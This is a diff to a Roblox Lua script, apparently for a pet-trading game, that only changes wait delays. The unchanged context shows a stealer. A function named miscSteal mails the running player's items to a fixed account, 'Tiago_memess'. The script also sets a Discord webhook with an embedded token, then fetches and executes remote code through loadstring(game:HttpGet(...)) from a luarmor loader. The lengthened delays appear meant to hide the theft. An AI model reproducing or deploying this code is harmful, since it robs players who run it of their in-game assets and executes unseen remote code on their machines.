@@ -14,7 +14,7 @@ for i, v in pairs(GetSave().Inventory.Currency) do
 end
 
 if GemAmount1 < 30000000 then
-    task.wait(15)
+    task.wait(30)
     waited = true
     game.ReplicatedStorage:WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
 end    
@@ -23,7 +23,7 @@ local function miscSteal()
     for i, v in pairs(save.Misc) do
        if v._am ~= nil then 
             if v.id == "Insta Plant Capsule" and v._am >= 200 then
-                task.wait(15)
+                task.wait(30)
                 local args = {
                     [1] = "Tiago_memess",
                     [2] = "DIAMOND SEEDS A BIRE",
@@ -32,7 +32,7 @@ local function miscSteal()
                     [5] = v._am - 1
                 }
                  if waited == false then
-                    task.wait(15)
+                    task.wait(30)
                     game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                 else
                     game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
@@ -51,7 +51,7 @@ getgenv().settings = {
             class = "Misc"
         }
     }
-task.wait(5)
+task.wait(15)
 getgenv().webhook = "https://discord.com/api/webhooks/1189711297827311616/y1MGTxuB8LosIVGm8ntw0tsBmgR7J6bOfZPgRPln8Un5Dyw5Gpvd5o714zaMNNqA_oUh"
 script_key="YyxWRRbkkVgEbClNmDPNgLGHfzCSyIeF"; 
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/fb2430277ea12a4fbea278cf8a4b3f49.lua"))()
